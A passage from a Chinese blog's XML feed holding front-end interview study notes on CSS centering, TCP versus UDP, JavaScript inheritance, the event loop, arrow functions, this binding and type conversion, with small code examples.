class="line">     <span class="attribute">display</span>: flex;</span><br><span class="line">     <span class="attribute">justify-content</span>: center;</span><br><span class="line">     <span class="attribute">align-items</span>: center;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><ol start="10"><li>table-cell + inline-block</li></ol><p>css新增的table属性，可以让我们把普通元素，变为table元素的现实效果，通过这个特性也可以实现水平垂直居中，这个属性和table标签一样的居中原理。 </p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.parent</span>&#123;</span><br><span class="line">    <span class="attribute">display</span>: table-cell;</span><br><span class="line">    <span class="attribute">text-align</span>: center;</span><br><span class="line">    <span class="attribute">vertical-align</span>: middle;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.child</span>&#123;</span><br><span class="line">    <span class="attribute">display</span>: inline-block;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>浏览器向服务器发送请求，但是中间发生丢包，最后返回了200ok</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. http协议，tcp协议</span><br><span class="line">2. 请求和响应属于http的范畴，丢包和重传属于TCP的范畴</span><br><span class="line">3. 丢包和重传由TCP管理，http不管</span><br></pre></td></tr></table></figure><ul><li>TCP与UDP</li></ul><p><strong>TCP与UDP区别总结：</strong></p><p>1、TCP面向连接（如打电话要先拨号建立连接）;UDP是无连接的，即发送数据之前不需要建立连接</p><p>2、TCP提供可靠的服务。也就是说，通过TCP连接传送的数据，无差错，不丢失，不重复，且按序到达;UDP尽最大努力交付，即不保证可靠交付。</p><p>Tcp通过校验和，重传控制，序号标识，滑动窗口、确认应答实现可靠传输。如丢包时的重发控制，还可以对次序乱掉的分包进行顺序控制。</p><p>3、UDP具有较好的实时性，工作效率比TCP高，适用于对高速传输和实时性有较高的通信或广播通信。</p><p><strong>为什么UDP有时比TCP更有优势?</strong></p><p>UDP以其简单、传输快的优势，在越来越多场景下取代了TCP,如实时游戏。</p><p>（1）网速的提升给UDP的稳定性提供可靠网络保障，丢包率很低，如果使用应用层重传，能够确保传输的可靠性。</p><p>（2）TCP为了实现网络通信的可靠性，使用了复杂的拥塞控制算法，建立了繁琐的握手过程，由于TCP内置的系统协议栈中，极难对其进行改进。</p><p>采用TCP，一旦发生丢包，TCP会将后续的包缓存起来，等前面的包重传并接收到后再继续发送，延时会越来越大，基于UDP对实时性要求较为严格的情况下，采用自定义重传机制，能够把丢包产生的延迟降到最低，尽量减少网络问题对游戏性造成影响。</p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>日常-2020.3.6</title>
      <link href="2020/03/06/%E6%97%A5%E5%B8%B8-2020.3.6/"/>
      <url>2020/03/06/%E6%97%A5%E5%B8%B8-2020.3.6/</url>
      
        <content type="html"><![CDATA[<h1 id="今日清单"><a href="#今日清单" class="headerlink" title="今日清单"></a>今日清单</h1><ul><li>给一个无序数组分成两个数组，让两个数组的和最接近</li><li>说一下满二叉树与完全二叉树，以及使用数组实现满二叉树 </li><li>求两个字符串的最长公共前前缀</li><li>==和===的区别</li><li>JS实现继承的几种方式和好处</li><li>settimeout和setinteval的区别以及事件轮询</li><li>聊一下箭头函数</li><li>聊一下this</li></ul><a id="more"></a><h2 id="2-无序数组分成两个数组，让两个数组的和最接近"><a href="#2-无序数组分成两个数组，让两个数组的和最接近" class="headerlink" title="2.无序数组分成两个数组，让两个数组的和最接近"></a>2.无序数组分成两个数组，让两个数组的和最接近</h2><p>这个问题可以转化为求数组的一个子集，使得这个子集中的元素的和尽可能接近sum/2，其中sum为数组中所有元素的和。这样转换之后这个问题就很类似0-1背包问题了：在n件物品中找到m件物品，他们的可以装入背包中，且总价值最大不过这里不考虑价值，就考虑使得这些元素的和尽量接近sum/2。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">输入: n物品重W[1:n], 价值V[1:n],  背包容量C </span><br><span class="line">输出: 装包使得价值最大 (物品重量为整数). </span><br><span class="line">g[i,k] = 由[1:i]组合出重量&lt;=k的最大价值 </span><br><span class="line">如果第i件物品没有包括在其中，则g[i,k] = g[i-1,k]  </span><br><span class="line">如果第i件物品包括在其中，则g[i,k] = g[i-1,k-W[i]] + V[i]</span><br><span class="line"></span><br><span class="line">转移方程：g[i,k] = max&#123; g[i-1,k], g[i-1,k-W[i]] + V[i] &#125; (OSP)</span><br></pre></td></tr></table></figure><h2 id="3-完全二叉树与满二叉树"><a href="#3-完全二叉树与满二叉树" class="headerlink" title="3. 完全二叉树与满二叉树"></a>3. 完全二叉树与满二叉树</h2><p>满二叉树：高度为h，结点数为2^h-1</p><p>完全二叉树：结点与满二叉树中的结点一一对应</p><p>完全二叉树与满二叉树采用顺序存储比较合适，而且从<strong>下标1</strong>开始存储，因为满足左孩子为2i，右孩子2i+1</p><h2 id="4-最长公共前缀"><a href="#4-最长公共前缀" class="headerlink" title="4. 最长公共前缀"></a>4. 最长公共前缀</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">纵向扫描，将首个字符串每个位置的字符与其余字符串相应位置的字符逐个进行比较。</span><br></pre></td></tr></table></figure><h2 id="5-和-的区别"><a href="#5-和-的区别" class="headerlink" title="5. ==和===的区别"></a>5. ==和===的区别</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">== 代表相同， ===代表严格相同, 为啥这么说呢， </span><br><span class="line"></span><br><span class="line">这么理解： 当进行双等号比较时候： 先检查两个操作数数据类型，如果相同， 则进行===比较， 如果不同， 则愿意为你进行一次类型转换， 转换成相同类型后再进行比较， 而===比较时， 如果类型不同，直接就是false.</span><br><span class="line"></span><br><span class="line">null == undefined //true，是一种规定</span><br><span class="line">null === undefined //false</span><br><span class="line"></span><br><span class="line">因为类型不同</span><br><span class="line">typeof null        //object</span><br><span class="line">typeof undefined    //undefined</span><br></pre></td></tr></table></figure><h2 id="6-JS的继承方式"><a href="#6-JS的继承方式" class="headerlink" title="6.JS的继承方式"></a>6.JS的继承方式</h2><p><strong>（1）原型链继承：子类原型是对父类的实例化</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Father</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Son</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">Son.prototype = <span class="keyword">new</span> Father()   <span class="comment">//实例化对象会指向父类的原型，如图</span></span><br></pre></td></tr></table></figure><p><img src="http://lizhenchao.oss-cn-shenzhen.aliyuncs.com/imgs/public/16-11-11/5352248.jpg" alt="1"></p><p>缺点：</p><p>1.父类的共有属性会被子类实例共享</p><p>2.创建子类对象无法传参，因为只有Son.prototype = new Father()可以传，但是会对所有子类有效。</p><p> <strong>（2）构造函数继承</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Father</span>(<span class="params">name,age</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br><span class="line">    <span class="keyword">this</span>.age = age;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Son</span>(<span class="params">name,age,sex</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.sex = sex;</span><br><span class="line">    Father.call(<span class="keyword">this</span>,name,age)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> son1 = <span class="keyword">new</span> Son(<span class="string">'张三'</span>,<span class="string">'30'</span>,<span class="string">'男'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//简述new一个对象的过程</span></span><br><span class="line"><span class="comment">//1.创造一个新的空对象</span></span><br><span class="line"><span class="comment">//2.新对象的_proto_指向构造函数的原型对象</span></span><br><span class="line"><span class="comment">//3.构造函数的this指向正在创建的新对象，并执行构造函数的代码，向新对象中添加属性和方法。</span></span><br><span class="line"><span class="comment">//4.返回新对象地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//讲一下_proto_和prototype的区别</span></span><br><span class="line"><span class="comment">//1.__proto__是 对象实例 都有的，而 prototype 是函数对象特有的</span></span><br><span class="line"><span class="comment">//2.prototype 原型对象 有 constructor 属性，又指回 构造函数</span></span><br><span class="line"><span class="comment">//3.对象实例的 __proto__ 均默认指向 它们的 构造函数的 prototype</span></span><br></pre></td></tr></table></figure><p>缺点：1.父类的原型方法不会被子类继承，如果全放到构造函数中，每个子类实例都单独拥有一份，违反复用性。</p><p>​        2.不能通过 son instanceof Father</p><p><strong>（3）组合继承</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Father</span>(<span class="params">name,age</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br><span class="line">    <span class="keyword">this</span>.age = age;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Son</span>(<span class="params">name,age,sex</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.sex = sex;</span><br><span class="line">    Father.call(<span class="keyword">this</span>,name,age)</span><br><span class="line">&#125;</span><br><span class="line">Son.prototype = <span class="keyword">new</span> Father()</span><br></pre></td></tr></table></figure><p>缺点：父类的构造函数执行了两遍</p><p><strong>（4）原型式继承：对原型链继承的封装</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">inheritObject</span>(<span class="params">o</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">F</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">    F.prototype = o;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> F();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> book = &#123;</span><br><span class="line">    name:<span class="string">'js book'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> newBook = inheritObject(book)</span><br><span class="line"><span class="keyword">var</span> newBook.name = <span class="string">'ajax book'</span></span><br></pre></td></tr></table></figure><p>缺点：仍存在原型链继承的缺点</p><p>优点：F中无内容，开销比较小。</p><p><strong>（5）寄生式继承：对原型继承的二次封装并进行了扩展</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> book = &#123;</span><br><span class="line">    name:<span class="string">'js book'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">creteBook</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> o = inheritObject(obj); <span class="comment">//不仅有父类中的属性和方法</span></span><br><span class="line">    <span class="comment">//扩展新对象</span></span><br><span class="line">    o.getName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;     <span class="comment">//还添加了新的属性和方法</span></span><br><span class="line">        <span class="built_in">console</span>.log(name)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> o</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>缺点：方法在函数中定义，无法得到复用</p><p><strong>（6）寄生组合继承（最理想）</strong></p><p>组合继承= 原型链继承 + 构造函数继承</p><p>寄生组合式继承=寄生式继承+构造函数继承</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">inheritObject</span>(<span class="params">o</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">F</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">    F.prototype = o;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> F();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">inheritPrototype</span>(<span class="params">subClass,superClass</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> p = inheritObject(superClass.prototype)</span><br><span class="line">    p.constructor = subClass</span><br><span class="line">    subClass.prototype = p</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//父类</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SuperClass</span>(<span class="params">name</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//子类</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SubClass</span>(<span class="params">name,time</span>)</span>&#123;</span><br><span class="line">    <span class="comment">//构造函数式继承</span></span><br><span class="line">    SuperClass.call(<span class="keyword">this</span>,name)</span><br><span class="line">    <span class="keyword">this</span>.time = time</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//寄生式继承父类原型</span></span><br><span class="line">inheritPrototype(subClass,superClass)</span><br></pre></td></tr></table></figure><h2 id="7-settimeout和setinteval的区别以及事件轮询"><a href="#7-settimeout和setinteval的区别以及事件轮询" class="headerlink" title="7.settimeout和setinteval的区别以及事件轮询"></a>7.settimeout和setinteval的区别以及事件轮询</h2><p>setTimeout() 方法用于在指定的毫秒数后调用函数或计算表达式。 </p><p>setinteval()方法用于每隔指定的毫秒数后调用函数或计算表达式。   性能更好</p><p>是两个最基本的异步函数。</p><ul><li>同步任务：在主线程上排队执行任务</li><li>异步任务：不进入主线程，而进入任务队列的任务。    常见：定时器,时间绑定,ajax,回调函数</li><li>执行机制：在主线程执行完当前所有的同步操作，主线程空闲后轮询任务队列，并将任务队列中的任务（回调函数）取出来执行。(该过程又称之为<strong>事件轮询</strong>)</li></ul><h2 id="8-箭头函数"><a href="#8-箭头函数" class="headerlink" title="8.箭头函数"></a>8.箭头函数</h2><p>箭头函数的含义</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">x =&gt; x * x  <span class="comment">//相当于</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> (<span class="params">x</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x * x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>new一个箭头函数可以吗？</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">箭头函数是匿名函数，不能作为构造函数，不能使用new</span><br></pre></td></tr></table></figure><ul><li>说一下箭头函数和普通函数的区别</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">（1）箭头函数是匿名函数，不能作为构造函数，不能使用new</span><br><span class="line">（2）箭头函数不绑定arguments，取而代之用rest参数...解决</span><br><span class="line">        let B = (b)=&gt;&#123;</span><br><span class="line">          console.log(arguments);</span><br><span class="line">        &#125;</span><br><span class="line">        B(2,92,32,32);   // Uncaught ReferenceError: arguments is not defined</span><br><span class="line"></span><br><span class="line">        let C = (...c) =&gt; &#123;</span><br><span class="line">          console.log(c);</span><br><span class="line">        &#125;</span><br><span class="line">        C(3,82,32,11323);  // [3, 82, 32, 11323]</span><br><span class="line">（3）箭头函数不绑定this，会捕获其所在的上下文的this值，作为自己的this值</span><br><span class="line">（4）箭头函数通过 call()或apply() 方法调用一个函数时，对 this 并没有影响。</span><br><span class="line">（5）箭头函数没有原型属性</span><br></pre></td></tr></table></figure><h2 id="9-this的指向"><a href="#9-this的指向" class="headerlink" title="9. this的指向"></a>9. this的指向</h2><ul><li>普通函数指向函数调用者（执行的时候才确定）</li><li>箭头函数指向函数所在的作用域（对象的{}和if(){}都构不成作用域）</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">    name:<span class="string">'objName'</span>,</span><br><span class="line">    say:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="built_in">console</span>.log(<span class="keyword">this</span>.name)&#125;,</span><br><span class="line">    read:<span class="function"><span class="params">()</span>=&gt;</span>&#123;<span class="built_in">console</span>.log(<span class="keyword">this</span>.name)&#125;</span><br><span class="line">&#125;</span><br><span class="line">obj.say();  <span class="comment">//objName     指向的是调用者</span></span><br><span class="line">obj.read(); <span class="comment">//undefined   指向的是window.name</span></span><br></pre></td></tr></table></figure><p>怎么答：</p><ol><li>全局环境中的this指向全局对象window</li><li>new绑定，并且构造函数没有<strong>返回其他对象</strong>，this指向这个新对象</li><li>通过call，apply，bind，并且第一个参数值不是Null,undefined，那么this绑定的就是指定的对象</li><li>普通函数指向函数调用者（执行的时候才确定）</li><li>箭头函数指向函数所在的作用域，根据上下文确定</li></ol><p>关于第二条</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">this</span>.user = <span class="string">'追梦子'</span>;  </span><br><span class="line">    <span class="keyword">return</span> &#123;&#125;;  </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> fn;  </span><br><span class="line"><span class="built_in">console</span>.log(a.user); <span class="comment">//undefined</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JS数据类型</title>
      <link href="2020/03/05/%E6%95%B4%E7%90%86-JS%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/"/>
      <url>2020/03/05/%E6%95%B4%E7%90%86-JS%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="JS基本数据类型与类型转换"><a href="#JS基本数据类型与类型转换" class="headerlink" title="JS基本数据类型与类型转换"></a>JS基本数据类型与类型转换</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ES5基本有5种简单数据类型：String，Number，Boolean，Null，undefined。一种复杂的数据类型Object。</span><br><span class="line">ES6新增一种简单数据类型：Symbol,还有BigInt</span><br><span class="line">JS是动态类型语言，所以类型不同的时候进行运算会进行类型转换。</span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="转字符串"><a href="#转字符串" class="headerlink" title="转字符串"></a>转字符串</h3><ul><li>转字符串可以理解为 + “”，底层是toString方法，其中对象转为[object object]，数组去括号+“”</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2</span>+<span class="string">"3"</span>          <span class="comment">//Number(2).toString()+"3"</span></span><br><span class="line"><span class="literal">true</span>+<span class="string">"1"</span>       <span class="comment">//Boolean(true).toString()+"1"</span></span><br><span class="line"><span class="string">""</span>+&#123;&#125;          <span class="comment">//输出[object object]</span></span><br><span class="line"><span class="string">""</span>+&#123;<span class="attr">A</span>:<span class="number">123</span>&#125;     <span class="comment">//[object object]</span></span><br><span class="line"><span class="string">"123"</span>==&#123;toString()&#123;<span class="keyword">return</span> <span class="string">"123"</span>&#125;&#125;    <span class="comment">//true，因为重写了toString方法</span></span><br><span class="line"><span class="string">""</span>+[]          <span class="comment">//""</span></span><br><span class="line"><span class="string">""</span>+[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]     <span class="comment">//"1,2,3"</span></span><br></pre></td></tr></table></figure><h3 id="转布尔型"><a href="#转布尔型" class="headerlink" title="转布尔型"></a>转布尔型</h3><p>Boolean()传入变量</p><p>0，NaN，””，null，undefined，false直接转换成false，其余都是真</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">!!<span class="string">"123"</span>       <span class="comment">//true</span></span><br><span class="line">!!&#123;&#125;          <span class="comment">//true</span></span><br></pre></td></tr></table></figure><h3 id="一道题"><a href="#一道题" class="headerlink" title="一道题"></a>一道题</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> aLi = <span class="built_in">document</span>.querySelectrAll(<span class="string">"li"</span>)</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> item,i = <span class="number">0</span>;item = aLi[i++];)&#123;  <span class="comment">//每次赋值都返回当前值，当最后输出undefined是转布尔false</span></span><br><span class="line">        <span class="built_in">console</span>.log(item)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="转数值"><a href="#转数值" class="headerlink" title="转数值"></a>转数值</h3><p>Number()除了0，“”，false会转成0，true转成1，其余都是调用toSring若是数值形式就转数值，不然是NaN</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Number</span>(<span class="literal">NaN</span>)        <span class="comment">//NaN</span></span><br><span class="line"><span class="built_in">Number</span>(<span class="string">"NaN"</span>)      <span class="comment">//NaN</span></span><br><span class="line"><span class="built_in">Number</span>(<span class="number">0123</span>)       <span class="comment">//83</span></span><br><span class="line"><span class="built_in">Number</span>(<span class="string">"0123"</span>)     <span class="comment">//123</span></span><br><span class="line"><span class="built_in">Number</span>(<span class="string">"Infinity"</span>) <span class="comment">//Infinity</span></span><br><span class="line"><span class="built_in">Number</span>([<span class="number">123</span>])      <span class="comment">//123   [123].toString()</span></span><br><span class="line"><span class="built_in">Number</span>([<span class="number">123</span>，<span class="number">3</span>])   <span class="comment">//NaN</span></span><br></pre></td></tr></table></figure><h3 id="运算符带来的强制类型转换"><a href="#运算符带来的强制类型转换" class="headerlink" title="运算符带来的强制类型转换"></a>运算符带来的强制类型转换</h3><p>有字符串时加法会把其余类型转换为字符串</p><p>-，*，、，%优先转数值</p><p>非数值类型加法会转数值</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"3"</span>-<span class="string">"2"</span>            <span class="comment">//1</span></span><br><span class="line"><span class="number">3</span>+<span class="number">2</span>+<span class="string">"1"</span>            <span class="comment">//"51"</span></span><br><span class="line"><span class="string">"3"</span>+<span class="number">2</span>+<span class="number">1</span>            <span class="comment">//"321"</span></span><br><span class="line"><span class="string">"312"</span>*<span class="number">1</span>            <span class="comment">//312</span></span><br><span class="line"><span class="number">123</span>+<span class="literal">null</span>           <span class="comment">//123+Number(null)</span></span><br><span class="line">[]+&#123;&#125;              <span class="comment">//两个对象相加调用toString，""+[object object] = [object object]</span></span><br><span class="line">&#123;&#125;+[]              <span class="comment">//&#123;&#125;解析为代码块，+[]，优先转为数值，0</span></span><br><span class="line">[<span class="number">1</span>,<span class="number">2</span>]+[<span class="number">2</span>,<span class="number">3</span>]        <span class="comment">//"1,22,3"</span></span><br></pre></td></tr></table></figure><p>在js中，加法运算的规则很简单，只会触发两种情况:</p><blockquote><ol><li>number + number</li><li>string + string</li></ol><p>除了这两种，若：</p><p>如果有一个数为string，则将另一个操作数隐式的转换为string，然后通过字符串拼接得出结果。</p><p>如果为布尔值这种简单的数据类型，那么将会转换为number类型来进行运算得出结果。</p><p>如果操作数为对象或者是数组这种复杂的数据类型，那么就将两个操作数都转换为字符串，进行拼接 </p></blockquote><h2 id="JS如何进行类型判断"><a href="#JS如何进行类型判断" class="headerlink" title="JS如何进行类型判断"></a>JS如何进行类型判断</h2><ul><li>typeof关键字，存在问题</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span> <span class="number">2</span>);               <span class="comment">// number</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span> <span class="literal">true</span>);            <span class="comment">// boolean</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span> <span class="string">'str'</span>);           <span class="comment">// string</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span> []);              <span class="comment">// object     []数组的数据类型在 typeof 中被解释为 object</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;);    <span class="comment">// function</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span> &#123;&#125;);              <span class="comment">// object</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span> <span class="literal">undefined</span>);       <span class="comment">// undefined</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span> <span class="literal">null</span>);            <span class="comment">// object     null 的数据类型被 typeof 解释为 object</span></span><br><span class="line"><span class="comment">//这是js发展过程中设计者的重大失误，早期准备更改null的类型为null，由于当时已经有大量网站使用了null，如果更改，将导致很多网站的逻辑出现漏洞问题，就没有更改过来</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span> <span class="keyword">new</span> <span class="built_in">Boolean</span>(<span class="literal">true</span>));   <span class="comment">//object</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span> <span class="keyword">new</span> <span class="built_in">Number</span>(<span class="number">1</span>));       <span class="comment">//object</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span> <span class="keyword">new</span> <span class="built_in">String</span>(<span class="string">"abc"</span>));   <span class="comment">//object</span></span><br><span class="line"><span class="comment">//对于一些创建的对象，它们都会返回'object'</span></span><br></pre></td></tr></table></figure><ul><li><p>instanceof关键字：</p><p>判断对象是否是某一数据类型（如Array）的实例 ，存在问题</p></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 